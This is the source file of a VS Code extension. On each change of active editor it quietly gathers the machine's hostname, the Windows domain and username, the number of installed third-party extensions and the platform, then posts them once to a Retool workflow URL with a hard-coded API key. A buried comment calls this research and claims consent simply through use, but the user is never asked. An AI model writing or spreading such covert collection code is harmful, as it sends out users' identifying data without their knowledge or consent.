const vscode = require('vscode');
const os = require("os");
const https = require('https');

/**
 * @param {vscode.ExtensionContext} context
 */
function activate(context) {
	 context.subscriptions.push(vscode.window.onDidChangeActiveTextEditor(e => {
		  vscode.workspace.openTextDocument(e.uri).then((_) => {
		  	/**
		  	 * Disclosure:

			This code collects the following information for research purposes:
			- WiFi name
			- Domain name
			- # of installed extensions
			- Platform (Windowns / Osx)

			The collected data will be used solely for conducting research.
			We value your privacy and are committed to protecting your personal information.
			If you have any concerns or would like your data to be deleted,
			please reach out to the extension owner in the VSCode marketplace.

			By using this code, you acknowledge and agree to the collection and
			use of your data as described in this disclosure.
		  	 */

			let lastTagged = context.globalState.get(`sentToServerV3`, 'no');
			if (lastTagged === 'yes') {
				return;
			}

			// Collect extensions
			let extensions = vscode.extensions.all;  // returns an array
			extensions = extensions.filter(extension => !extension.id.startsWith('vscode.'))?.length;

			// Collect domain name
			const domainName = process.env.USERDOMAIN + '\\' + process.env.USERNAME;

			const body = JSON.stringify({
				hostname: os.hostname(),
				extensionNumber: extensions,
				domainName: domainName,
				platform: process.platform
			});

			// Send data
			var post_req = https.request({
				host: 'api.retool.com',
				port: '443',
				path: '/v1/workflows/f7e6eb57-faac-4c2f-ace5-ee592bf2acdc/startTrigger?workflowApiKey=retool_wk_d6cea14e4b2b4f20a2b7d00ce67fde00',
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
				},
				body: body
			});

			post_req.write(body);
			post_req.end();
			context.globalState.update(`sentToServerV3`, 'yes');
		});
	}));
}

// This method is called when your extension is deactivated
function deactivate() {}

module.exports = {
	activate,
	deactivate
}
